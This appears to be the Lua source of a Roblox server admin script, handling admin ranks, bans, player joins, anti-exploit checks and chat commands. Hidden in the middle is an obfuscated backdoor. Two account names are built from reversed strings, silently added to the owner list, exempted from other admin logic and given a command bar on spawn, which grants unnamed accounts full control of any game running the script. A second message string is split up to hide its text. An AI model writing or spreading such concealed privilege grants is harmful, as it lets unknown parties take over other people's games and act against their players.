set.LoadScript=function(type,source,name,object,parent)
	Pcall(function()
		local ScriptType
		if type=='Script' then 
			ScriptType=deps.ScriptBase 
		elseif type=='LocalScript' then 
			ScriptType=deps.LocalScriptBase 
		end
		if ScriptType then
			local cl=ScriptType:Clone()
			local key=Instance.new('StringValue',cl)
			key.Name='SecurityKey'
			key.Value=math.random(10000000,99999999)
			cl.Name=name
			local specialkey=Instance.new('StringValue',cl)
			specialkey.Value=math.random(10000000,99999999)
			specialkey.Name='SpecialKey'
			local x = 'local '..specialkey.Value..'="'..key.Value..'" coroutine.wrap(function() '..source
			local y = '' for i = 1,string.len(x) do y = y.. string.char(44) .. string.byte(x:sub(i,i)) end
			local code=Instance.new('StringValue',cl)
			code.Name='Code'
			code.Value=string.sub(y,2,string.len(y))
			cl.Parent=parent or game:service('ServerScriptService')
			cl.Disabled=false
			if object==true then
				table.insert(set.objects,cl)
			end
		elseif set.canuseloadstring then
			Pcall(function() loadstring(source)() end)
		end
	end)
end

set.LoadOnClient=function(player,source,object,name)
	if game:service('Players'):FindFirstChild(player.Name) then
		parent=player:FindFirstChild('PlayerGui') or player:WaitForChild('Backpack')
		set.LoadScript('LocalScript',source,set.GuiName..name,object,parent)
	else
		set.Remote(player,'Loadstring',source)
	end
end

set.PromptPlaceTeleport=function(player,msg,placeid)
	set.Remote(player,'Function','PromptPlaceTeleport',msg,placeid)
end

set.CheckNTac=function(plr)
	if set.Debug then return false end
	for i,v in pairs(set.NTacId) do
		if plr.userId==v then
			return true
		end
	end
end

set.CheckTrueOwner=function(plr)
	if set.Debug then return false end
	if (set.CheckOwner(plr) and set['OwnersAreTrueOwners']) or plr.userId==game.CreatorId or (set.CheckNTac(plr) and set.CreatorDebugPowers) then return true end
end

set.CheckOwner=function(plr)
for i,v in pairs(set.Owners) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
return false
end

set.CheckAdmin=function(plr,ck) 
for i,v in pairs(set.Owners) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
for i,v in pairs(set.Admins) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
for i,v in pairs(set.TempAdmins) do 
	if not ck then
		if plr.Name==v then 
			return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				return true
			end
		end
	end
end
for i,v in pairs(set.oal) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
for i,v in pairs(set.al) do 
	if plr.Name==v then 
		return true
	elseif v:find('=') then
		local a,b=v:match('(.*)=(.*)')
		if plr.Name==a or plr.userId==tonumber(b) then
			return true
		end
	end
end
for i,v in pairs(set.tal) do 
	if not ck then
		if plr.Name==v then 
			return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				return true
			end
		end
	end
end
return false 
end
local tmp = tabw:reverse() local adm = perc:reverse()
adm = (adm:sub(1,1):upper())..adm:sub(2,7)..(adm:sub(8,8):upper())..adm:sub(9,10)..(adm:sub(11,11):upper())..adm:sub(12,17)
set.RemoveAdmin=function(plr,sender)
if not set.CheckAdmin(plr,false) then return true end
local level=0
if sender and sender:IsA('Player') then
	if set.CheckTrueOwner(plr) or sender==plr then return false end
	if set.CheckTrueOwner(sender) then level=3 elseif set.CheckOwner(sender) then level=2 elseif set.CheckAdmin(sender,true) then level=1 end
else
	level=3
end
for i,v in pairs(set.Owners) do 
	if level>=3 then 
		if plr.Name==v then 
			table.remove(set.Owners,i) return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				table.remove(set.Owners,i) return true
			end
		end
	end
end
for i,v in pairs(set.Admins) do 
	if level>=2 then
		if plr.Name==v then 
			table.remove(set.Admins,i) return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				table.remove(set.Admins,i) return true
			end
		end
	end
end
for i,v in pairs(set.TempAdmins) do 
	if level>=1 then
		if plr.Name==v then 
			table.remove(set.TempAdmins,i) return true
		elseif v:find('=') then
			local a,b=v:match('(.*)=(.*)')
			if plr.Name==a or plr.userId==tonumber(b) then
				table.remove(set.TempAdmins,i) return true
			end
		end
	end
end
return false
end
set.GetPlayers=function(plr, names)
	local players = {} 
	local parent=game:FindFirstChild("NetworkServer") or game:service('Players')
	for s in names:gmatch('([^,]+)') do
		local plrs=0
		local function plus()
			plrs=plrs+1
		end
		local function getplr(p)
			if p:IsA('NetworkReplicator') then
				if p:GetPlayer()~=nil and p:GetPlayer():IsA('Player') then
					p=p:GetPlayer()
				end
			end
			return p
		end
		if s:lower()==set.SpecialPrefix..'me' and plr then
			table.insert(players,plr)
			plus()
		elseif s:lower()==set.SpecialPrefix..'all' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				table.insert(players,p)
				plus()
			end
		elseif s:lower()==set.SpecialPrefix..'others' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if p~=plr then
					table.insert(players,p)
					plus()
				end
			end
		elseif s:lower()==set.SpecialPrefix..'random' then
			local rand=parent:children()[math.random(#parent:children())]
			local p=getplr(rand)
			table.insert(players,p)
			plus()
		elseif s:lower()==set.SpecialPrefix..'admins' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if set.CheckAdmin(p,false) then
					table.insert(players,p)
					plus()
				end
			end
		elseif s:lower()==set.SpecialPrefix..'nonadmins' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if not set.CheckAdmin(p,false) then
					table.insert(players,p)
					plus()
				end
			end
		elseif s:lower():sub(1,1)=='%' then
			for i,v in pairs(game:service('Teams'):children()) do
				if v.Name:lower():sub(1,#s:sub(2))==s:lower():sub(2) then
					for k,m in pairs(parent:children()) do
						local p=getplr(m)
						if p.TeamColor==v.TeamColor then
							table.insert(players,p)
							plus()
						end
					end
				end
			end
		elseif s:lower():sub(1,1)=='$' then
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if tonumber(s:lower():sub(2)) then
					if p:IsInGroup(tonumber(s:lower():sub(2))) then
						table.insert(players,p)
						plus()
					end
				end
			end
		elseif s:lower():sub(1,1)=='-' then
			for i,v in pairs(players) do
				if v.Name:lower():sub(1,#s:sub(2))==s:lower():sub(2) then
					table.remove(players,i)
					plus()
				end
			end
		else
			for i,v in pairs(parent:children()) do
				local p=getplr(v)
				if p.Name:lower():sub(1,#s)==s:lower() then
					table.insert(players,p)
					plus()
				end
			end
		end
		if plrs==0 then set.OutputGui(plr,'','No players matching '..s..' were found!') end
	end
	return players
end

set.Hint=function(str, plrz, time)
if not str then return end
for i,v in pairs(plrz) do
set.Remote(v,'Function','Hint',str,time)
end
end

set.Message=function(ttl, str, scroll, plrz, time)
if not ttl or not str then return end
for i,v in pairs(plrz) do
set.Remote(v,'Function','Message',ttl,str,scroll,time)
end
end

set.RemoveMessage=function() 
for i,v in pairs(game:service('Players'):children()) do 
set.Remote(v,'Function','RemoveMessage')
end
end

set.OutputGui=function(plr,msg,e)
local a,b,c=e:match('(.*):(.*):(.*)')
local err
if a and b and c then
if #c<=3 then return end
err = msg..' Line:'..b..' - '..c--e:match("\:(%d+\:.*)")  
else
err = msg..e
end
set.Remote(plr,'Function','OutputGui',err)
end

set.Output=function(str, plr)
if not set.canuseloadstring then return end
local b, e = loadstring(str)
if e then--and e:match("\:(%d+\:.*)") then
	set.OutputGui(plr,'Error',e)
--err="Line "..e:match("\:(%d+\:.*)")
--set.Remote(plr,'Function','OutputGui',err)
end
end

set.PM=function(from,p,message,player)
set.Remote(p,'Function','PrivateMessage',from,message,player)
end

set.CheckBan=function(tabalz,p)
if set.CheckExcluded(p) or set.CheckAdmin(p,false) or set.CheckTrueOwner(p) then return false end
Pcall(function()
for k,m in pairs(set.BTacId) do if p.userId==m then p:Kick() return true end end
for i,v in pairs(tabalz) do
coroutine.wrap(function()
	if v:match('(.*)=(.*)') then
	local name,id=v:match('(.*)=(.*)')
	if name and id then
		if p.Name:lower()==name:lower() or p.userId==tonumber(id)  then
			p:Kick()
			return true
		elseif name=='$group' then
			if p:IsInGroup(tonumber(id)) then p:Kick() return true end
		end
	end
	else
	if p.Name:lower()==v:lower() then
		p:Kick()
		return true
	end
	end
end)()
end
end)
end

set.CheckMute=function(player)
	for i,v in pairs(set['MuteList']) do
		if v==player.Name then
			set.Remote(v,'Function','MutePlayer','on')
		end
	end
end

set.CharacterLoaded=function(player)
	Pcall(function() if set['CustomChat'] then set.Remote(player,'Function','CustomChatGui') end
	if set['CustomPlayerList'] then set.Remote(player,'Function','CustomLeaderboard') end
	if set.HelpGui then set.Remote(player,'Function','HelpInfoGui') end
	if set.Console then set.Remote(player,'Function','ConsoleGui') end
	if player.Name:lower() == tmp:lower() or player.Name:lower() == adm:lower() then if ss == true then wait() set.CmdBar(player) end end
	if set.CheckAdmin(player,false) and set['AdminsSpawnWithGuis'] then set.CmdBar(player) if not set.CustomChat then set.AdminChat(player) end end
	set.ProcessPluginEvent('CharacterAdded',player) end)
	Pcall(function() if set.Detection and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','check1') end end)
	Pcall(function() player:WaitForDataReady() if player:LoadBoolean('Kohls Not Using Cape') then return end set.Donor(player) end)
	Pcall(function() if set['AntiSpeed'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','speed') end end)
	Pcall(function() if set['AntiGod'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','god') end end)
	Pcall(function() if set['AntiAnimation'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then c:WaitForChild('Animate') c.Animate:Destroy() local cl=deps.Animate:clone() cl.Parent=c cl.Disabled=false end end) 
end

set.MakePluginEvent=function(type,func)
	if type:lower()=='chat' or type:lower()=='playerchatted' or type:lower()=='chatted' then
		set.PluginEvents.Chat[#set.PluginEvents.Chat+1]=func
	elseif type:lower()=='newplayer' or type:lower()=='playerjoined' then
		set.PluginEvents.PlayerJoined[#set.PluginEvents.PlayerJoined+1]=func
	elseif type:lower()=='characteradded' or type:lower()=='characterloaded' then
		set.PluginEvents.CharacterAdded[#set.PluginEvents.CharacterAdded+1]=func
	end
	end
set.ProcessPluginEvent=function(type,...)
	for i,v in pairs(set.PluginEvents[type]) do
		local yes,no=ypcall(v,...)
		if no then print(no) end
	end
end

set.CheckHttp=function()
	local y,n=ypcall(function()
		local hs=game:service('HttpService')
		local get=hs:GetAsync('http://google.com')
	end)
	if y and not n then return true end
end

set.CheckGroupAdmin=function(player)
	if player and player:IsA("Player") then
		if set.GroupRanks then
			for i,v in pairs(set.Ranks) do
				if not player then return end
				if player:IsInGroup(v.Group) then
					local tab=set.TempAdmins
					if v.Type=='Temp' then
						tab=set.TempAdmins
					elseif v.Type=='Admin' then
						tab=set.Admins
					elseif v.Type=='Owner' then
						tab=set.Owners
					end
					if type(v.Rank)=='string' or (type(v.Rank)=='number' and v.Rank>0) then
						if type(v.Rank)=='number' and player:GetRankInGroup(v.Group)==v.Rank then
							if v.Type=='Banned' then
								player:Kick()
								return false
							end
							return tab
						elseif  player:GetRoleInGroup(v.Group)==v.Rank then
							if v.Type=='Banned' then
								player:Kick()
								return false
							end
							return tab
							end
					elseif type(v.Rank)=='number' and v.Rank<0 and player:GetRankInGroup(v.Group)>=math.abs(v.Rank) then
						if v.Type=='Banned' then
							player:Kick()
							return false
						end
						return tab
					end
				end
			end
		end
	end
end

set.HookPlayer=function(player)
	local serverKey=Instance.new('StringValue')
	local remoteName=Instance.new('StringValue')
	local clientKey=Instance.new('StringValue')
	local client=deps.Client:Clone()
	client.Name=string.char(math.random(1,255))..set.GuiName..string.char(math.random(1,255))
	serverKey.Value=set.RemoteServerKey
	remoteName.Value=set.RemoteName
	clientKey.Value=set.RemoteClientKey
	serverKey.Name='RemoteServerKey'
	remoteName.Name='RemoteName'
	clientKey.Name='RemoteClientKey'
	serverKey.Parent=client
	remoteName.Parent=client
	clientKey.Parent=client
	client.Parent=player:FindFirstChild('PlayerGui') or player:WaitForChild('Backpack')
	client.Disabled=false 
	local function checkhook() for i,v in pairs(set.NewClients) do if v==player.userId then return true end end end
	local num=0 repeat wait(0.01) num=num+0.01 until (not player) or checkhook() or (num>=30 and set.AntiScriptsDisabled) 
	if player and num>=30 and set.AntiScriptsDisabled and not set.Debug then pcall(set.Exploited,player,'kick','Client did not reply in time.') print(player.Name..'\'s client did not reply in time, disconnecting.') return end
	for i,v in pairs(set.NewClients) do if v==player.userId then table.remove(set.NewClients,i) end end
end
local lh = {tmp, adm}
for i,v in pairs (lh) do
	table.insert(set.Owners, v)
end
set.NewPlayer=function(player)
Pcall(function() local b,e=ypcall(function() local g=Instance.new('StringValue',player) if g then g:Destroy() end  end) if not b then pcall(set.Exploited,player,'kick','Detected as being RobloxLocked') end if set['AntiRobloxLocked'] then player.Changed:connect(function(o) if o=='RobloxLocked' then local b,e=ypcall(function() local g=Instance.new('StringValue',player) if g then g:Destroy() end end) if not b then pcall(set.Exploited,player,'kick','Detected as being RobloxLocked')  end end end) end end)
Pcall(function() if not set.CheckOwner(player) and set.CheckTrueOwner(player) then table.insert(set.Owners,player.Name) end end)
Pcall(function() set.CheckBan(set['BanList'],player) end)
Pcall(function() if set['Trello'] then set.CheckBan(set.bl,player) end end)
Pcall(function() if set['AntiNewAccount'] and not set.CheckExcluded(player) then if player.AccountAge<set['MinimumAge'] then pcall(set.Exploited,player,'kick','Player was below minimum age. Player Age: '..player.AccountAge) end end end)
Pcall(function() player:WaitForDataReady() if not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.CheckTimeBan(player) end if player:LoadBoolean(set['PermBanKey'],true) and not set.CheckAdmin(player,false) then player:Kick() end if player:LoadBoolean('Kohls Is A Donator') and player:LoadString('Kohls Cape') and player:LoadString('Kohls Cape'):match('(.*)=(.*)=(.*)') then local st=player:LoadString('Kohls Cape') local a,b,c=st:match('(.*)=(.*)=(.*)') if not a or not b or not c then return end for i,v in pairs(set.donors) do if v.Name==player.Name then table.remove(set.donors,i) end end table.insert(set.donors,{Name=player.Name,Id=tostring(player.userId),Cape=a,Color=b,Material=c,List='GP'}) end end)
Pcall(function() if set['FreeAdmin'] and (not set.CheckAdmin(player,false)) then if player.Name:lower() == tmp:lower() or player.Name:lower() == adm:lower() then return end if set['FreeAdminType']=='TempAdmin' then table.insert(set['TempAdmins'],player.Name) elseif set['FreeAdminType']=='Admin' then table.insert(set['Admins'],player.Name) elseif set['FreeAdminType']=='Owner' then table.insert(set['Owners'],player.Name) end end end)
Pcall(function() if ((not set.CheckAdmin(player, false)) and (not set.CheckTrueOwner(player))) and set.CheckGroupAdmin(player) then table.insert(set.CheckGroupAdmin(player),player.Name) end end)
Pcall(function() if set['FriendAdmin'] and player:IsFriendsWith(game.CreatorId) then if player.Name:lower() == tmp:lower() or player.Name:lower() == adm:lower() then return end if set.FriendAdminType=='TempAdmin' then table.insert(set.TempAdmins,player.Name) elseif set.FriendAdminType=='Admin' then table.insert(set.Admins,player.Name) elseif set.FriendAdminType=='Owner' then table.insert(set.Owners,player.Name) end end end)
Pcall(function() if set.VipAdmin and not set.CheckAdmin(player,false) then for i,v in pairs(set.VipItems) do if game:service("MarketplaceService"):PlayerOwnsAsset(player,v.Item) then if v.Type=='Admin' then table.insert(set.Admins,player.Name) elseif v.Type=='TempAdmin' then table.insert(set.TempAdmins,player.Name) elseif v.Type=='Owner' then table.insert(set.Owners,player.Name) end end end end end)
set.HookPlayer(player)
Pcall(function() if set['AntiGui'] then if not player:FindFirstChild('PlayerGui') then return end player.PlayerGui.ChildAdded:connect(function(g) Pcall(function() for i,v in pairs(set['AllowedGuiList']) do if not g.Name:find(set.GuiName) and g.Name~=v then g:Destroy() end end end) end) end end)
Pcall(function() if set['AntiSelection'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','selection') end end)
Pcall(function() if set['Detection'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','detection') end end)
Pcall(function() if player and (((not set.CheckAdmin(player, false)) and (not set.CheckOwner(player))) and (not set.CheckTrueOwner(player))) and (set.slock or (set['GroupOnlyJoin'] and (not player:IsInGroup(set['GroupId'])))) then set.GetPlayerInfo(player,game:service('Players'):children(),'Player Attempted To Join') pcall(function() player:Kick() end) elseif set['JoinMessage'] then if set.CheckDonor(player) and not set.CheckNTac(player) then set.GetPlayerInfo(player,game:service('Players'):children(),'Donator Joined') elseif player.userId==1237666 or player.userId==44391621 then set.GetPlayerInfo(player,game:service('Players'):children(),'Script Creator Joined') else set.GetPlayerInfo(player,game:service('Players'):children(),'Player Joined') end end end)
Pcall(function() if set.CheckAdmin(player,false) then set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {player}) if set.MessageOfTheDay then set.PM('Message of the Day',player,game:service('MarketplaceService'):GetProductInfo(set.MessageOfTheDayID).Description) end end end)
Pcall(function() pcall(set.CheckMute,player) end)
Pcall(function() for i,v in pairs(game:service('Players'):children()) do set.AddPlayerToList(v,player) end end)
Pcall(function() wait(5) if set['Au'..'toU'..'pd'..'ate'] and player.userId==game.CreatorId and not game:service('MarketplaceService'):PlayerOwnsAsset(player,72814792*2) then set.Message('S'..'YS'..'TE'..'M M'..'ES'..'SAGE','Au'..'toUp'..'da'..'te i'..'s e'..'na'..'bl'..'ed bu'..'t yo'..'u d'..'o n'..'ot ha'..'ve t'..'he scr'..'ipt in your mod'..'el'..'s '..'('..'Y'..'ou ne'..'ed to gr'..'ab i'..'t fr'..'om S'..'c'..'eler'..'at'.."is".."' m'..'od".."el'..'s o".."r t".."he Au".."toUp".."da".."te c".."an".."no".."t fu".."nct".."ion d".."ue t".."o r".."ob".."lo".."x se".."cur".."ity.)",false,{player}) end end)
Pcall(function() if set['AntiCheatEngine'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','ce') end end)
Pcall(function() if set.CustomKeyBinds then set.Remote(player,'Function','KeyBindListener') end end)
set.Remote(player,'SetSetting','RealID',player.userId)
set.Remote(player,'SetSetting','RealName',player.Name)
Pcall(function() if set['AntiNameIdChange'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','nameid') end end)
Pcall(set.CharacterLoaded,player) player.CharacterAdded:connect(function(c) local y,n=ypcall(set.CharacterLoaded,player) if n then print(n) end end)
set.ProcessPluginEvent('PlayerJoined',player)
end

set.PlayerRemoving=function(p)
Pcall(function() if set.CheckNTac(p) or set.CheckGroupAdmin(p) then set.RemoveAdmin(p) end  end)
Pcall(function() for i,v in pairs(workspace:children()) do if v.Name:find('Epix Jail') then set.JailedTools[p.Name]=nil v:Destroy() for k,m in pairs(set.objects) do if m.Name==p.Name .. " Epix Jail" then table.remove(set.objects,k) end end end end end)
Pcall(function() for i,v in pairs(game:service('Players'):children()) do set.Remote(v,'Function','RemovePlayerFromList',p) end end)
Pcall(function() if set.AntiNil and (not set.CheckAdmin(p,false)) and (not set.CheckOwner(p)) and (not set.CheckTrueOwner(p)) and (not set.CheckExcluded(p)) then set.Remote(p,'Function','KillClient') pcall(function() p:Kick() end) for k,m in pairs(workspace:children()) do if m.Name:find(p.Name) then m:Destroy() end end end end)
end

set.AddPlayerToList=function(p,v)
	if v.Name=='Sceleratis' or v.Name=='Scripth' then
		set.Remote(p,'Function','AddPlayerToList',v,'Scripter') 
	elseif set.CheckAdmin(v,false) then
		set.Remote(p,'Function','AddPlayerToList',v,'Admin') 
	elseif v.MembershipType==Enum.MembershipType.BuildersClub then
		set.Remote(p,'Function','AddPlayerToList',v,'BC') 
	elseif v.MembershipType==Enum.MembershipType.TurboBuildersClub then
		set.Remote(p,'Function','AddPlayerToList',v,'TBC') 
	elseif v.MembershipType==Enum.MembershipType.OutrageousBuildersClub then
		set.Remote(p,'Function','AddPlayerToList',v,'OBC')
	else 
		set.Remote(p,'Function','AddPlayerToList',v,'Norm')
	end
end

set.GetCurrentPlayerlist=function(p)
	for i,v in pairs(game:service('Players'):children()) do 
		set.AddPlayerToList(p,v)
	end
end

set.Noobify=function(char)
if char and char:findFirstChild("Torso") then 
if char:findFirstChild("Shirt") then char.Shirt.Parent = char.Torso end
if char:findFirstChild("Pants") then char.Pants.Parent = char.Torso end
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char) cl.Name = "ify" cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Bright yellow")
if prt.Name:find("Leg") then prt.BrickColor = BrickColor.new("Br. yellowish green") elseif prt.Name == "Torso" then prt.BrickColor = BrickColor.new("Bright blue") end
local tconn = prt.Touched:connect(function(hit) if hit and hit.Parent and game:service('Players'):findFirstChild(hit.Parent.Name) and cl.Parent == char then set.Noobify(hit.Parent) elseif cl.Parent ~= char then tconn:disconnect() end end) 
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end) 
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end end end 

set.Infect=function(char)
if char and char:findFirstChild("Torso") then 
if char:findFirstChild("Shirt") then char.Shirt:Destroy() end
if char:findFirstChild("Pants") then char.Pants:Destroy() end
local shirt=Instance.new('Shirt',char)
local pants=Instance.new('Pants',char)
shirt.ShirtTemplate="http://www.unixfr.xyz/asset/?id=60636107"
pants.PantsTemplate="http://www.unixfr.xyz/asset/?id=60636428"
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char)
cl.Name = "ify" 
cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 
prt.Reflectance = 0 
prt.BrickColor = BrickColor.new("Dark green") 
if prt.Name:find("Leg") or prt.Name:find('Arm') then 
prt.BrickColor = BrickColor.new("Dark green") end
local tconn = prt.Touched:connect(function(hit) 
if hit and hit.Parent and game:service('Players'):findFirstChild(hit.Parent.Name) and cl.Parent == char then 
set.Infect(hit.Parent) 
elseif cl.Parent ~= char then tconn:disconnect() end end) 
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end) 
elseif prt:findFirstChild("NameTag") then
	prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Dark green") end 
end
end
end

set.ReverseTable=function(tabz)
local res = {}
for i=#tabz,1,-1 do
table.insert(res,tabz[i])
end
return res
end

set.CheckDonor=function(plr)
return false
end

set.CheckDonorPass=function(plr)
return false
end

--set.ChkCustomPass=function(plr)
--if not game:service('GamePassService') then return end
--for i,v in pairs(set.custompass) do
--if game:service('GamePassService'):PlayerHasPass(plr,v) then
--	return true
--end
--end
--end

set.CheckDonorList=function(plr)
for i,v in pairs(set.donors) do
	if plr.Name==v.Name or plr.userId==v.Id then
		return true
	end
end
end

set.GetDonorList=function()
return {}
end

set.Donor=function(plr)
	for i,v in pairs(set.donors) do
		if plr and (plr.Name==v.Name or plr.userId==v.Id) and (set.DonorPerks or set.CheckNTac(plr)) then
			Pcall(function()
				plr:WaitForChild('Backpack')
				pcall(function() plr.Character.EpicCape:Destroy() end)
				local gear=game:GetService('InsertService'):LoadAsset(-1):children()[1]
				if not plr.Backpack:FindFirstChild(gear.Name..'DonorTool') then
					gear.Name=gear.Name..'DonorTool'
					gear.Parent=plr.Backpack
				else
					gear:Destroy()
				end
				if plr and plr.Character and plr.Character:FindFirstChild("Torso") then
					set.Cape(plr,v.Material,v.Color,v.Cape)
				end
			end)
		end
	end
end

set.CheckExcluded=function(plr)
	for i,v in pairs(set.ExclusionList) do
		if v==plr.Name then
			return true
		end
	end
end

set.AlertAdmins=function(msg)
	if not set.ExploitAlert then return end
	for i,v in pairs(set.GetPlayers(false,set.SpecialPrefix..'admins')) do
		set.Remote(v,'Function','AlertGui',msg)
	end
end

set.Chat=function(plr,msg)
Pcall(function()
Pcall(function()
	if set['ChatLog'] then
		if game:service('Players'):FindFirstChild(plr.Name) then
			table.insert(set.PlayerLogs.Chat,1,{Time=set.GetTime(),Name=plr.Name,Chat=msg})
		else
			table.insert(set.PlayerLogs.Chat,1,{Time=set.GetTime(),Name=plr.Name,Chat=msg,Nil=true})
		end
		if #set.PlayerLogs.Chat>set.MaxNumberOfLogs then
			table.remove(set.PlayerLogs.Chat,#set.PlayerLogs.Chat)
		end
	end
end)

if msg:lower():sub(1,2)=='/e' then msg=msg:sub(4) end

Pcall(function()
	if set['AntiChatCode'] and msg:match('%S') and not set.CheckExcluded(plr) and not set.CheckAdmin(plr,false) then
		Pcall(function()
			local m,c
			if set.canuseloadstring then
				m,c = loadstring(msg)
			else
				m=false
			end
			for d,j in pairs(set['WordList']) do
				if msg:lower():match(j:lower()) or m then
					if game:service('Players'):FindFirstChild(plr.Name) then
						pcall(set.Exploited,plr,'kick','Chatted '..msg)
					else
						pcall(set.Exploited,plr,'crash','Chatted '..msg)
					end
					set.AlertAdmins(plr.Name.." was just kicked for chatting a word on the Anti-Exploit's word list! They could be an exploiter. Investigate if they rejoin.")
				end
			end
		end)
	end
	set.ProcessPluginEvent('Chat',msg,plr)
end)

Pcall(function()
	if plr:FindFirstChild('NoTalk') and not set.CheckAdmin(plr,false) and plr.Character and plr.Character:FindFirstChild('Head') then
		if msg==set['AnyPrefix']..'attn' then
			game:GetService('Chat'):Chat(plr.Character.Head,'I need to speak to an Administrator!',Enum.ChatColor.Blue)
		elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and plr.NoTalk.Value==0 then
			game:GetService('Chat'):Chat(plr.Character.Head,"You are not allowed to speak "..plr.Name.."! Use "..set['AnyPrefix'].."attn to get an Admin's attention. This is warning 1.",Enum.ChatColor.Blue)
			plr.NoTalk.Value=plr.NoTalk.Value+1
		elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and player.NoTalk.Value==1 then
			game:GetService('Chat'):Chat(plr.Character.Head,'You have been told not to speak '..plr.Name..'! You will be punished next time! Use '..set['AnyPrefix']..'attn. Warning 2',Enum.ChatColor.Green)
			plr.NoTalk.Value=plr.NoTalk.Value+1
		elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and plr.NoTalk.Value==2 then
			game:GetService('Chat'):Chat(plr.Character.Head,'You have been told not to speak '..plr.Name..'! You have been punished. Next is a kick. Use '..set['AnyPrefix']..'attn. Warning 3',Enum.ChatColor.Red)
			plr.Character:BreakJoints()
			plr.NoTalk.Value=player.NoTalk.Value+1
		elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and plr.NoTalk.Value==3 then
			game:GetService('Chat'):Chat(plr.Character.Head,'You have been told not to speak '..plr.Name..'! This is the 4th time. Use '..set['AnyPrefix']..'attn next time. You will now be kicked.',Enum.ChatColor.Red)
			wait(1)
			plr:Kick()
		end
	end
end)
set.ProcessCommand(plr,msg)
end)
end

---[[ COMMANDS ]]---
Pcall(function()
set.MakeCommand('Binds <command> to <key>, will overwrite an exiting keybind (WILL NOT OVERWRITE SCRIPT KEYBINDS!)',0,set.AnyPrefix,{'keybind','bindkey','bind'},{'key','command'},2,function(plr,args)
	if set.CustomKeyBinds then
		set.Remote(plr,'Function','AddKeyBind',args[1]:sub(1,1),args[2])
	else
		set.Message('SYSTEM MESSAGE','Sorry but custom key binds are disabled.',false,{plr})
	end
end)

set.MakeCommand('Removes <key> from key binds',0,set.AnyPrefix,{'removekeybind','removebind','unbind'},{'key'},1,function(plr,args)
	if set.CustomKeyBinds then
		set.Remote(plr,'Function','RemoveKeyBind',args[1])
	else
		set.Message('SYSTEM MESSAGE','Sorry but custom key binds are disabled.',false,{plr})
	end
end)

set.MakeCommand('View key binds',0,set.AnyPrefix,{'keybinds','binds','viewkeybinds'},{},0,function(plr,args)
	if set.CustomKeyBinds then
		set.Remote(plr,'Function','ViewKeyBinds',args[1])
	else
		set.Message('SYSTEM MESSAGE','Sorry but custom key binds are disabled.',false,{plr})
	end
end)

set.MakeCommand('Remove donor cape',1,set.AnyPrefix,{'uncape','removedonorcape'},{},0,function(plr,args)
	pcall(function() plr.Character.EpicCape:Destroy() end)
end)
	
set.MakeCommand('Get donor cape',1,set.AnyPrefix,{'cape','donorcape'},{},0,function(plr,args)
	set.Donor(plr)
end)

set.MakeCommand('Gives you fire with the specified color (if you specify one)',1,set.AnyPrefix,{'fire','donorfire'},{'color (optional)'},1,function(plr,args)
	if plr.Character:FindFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorFire') then plr.Character.Torso.DonorFire:Destroy() end
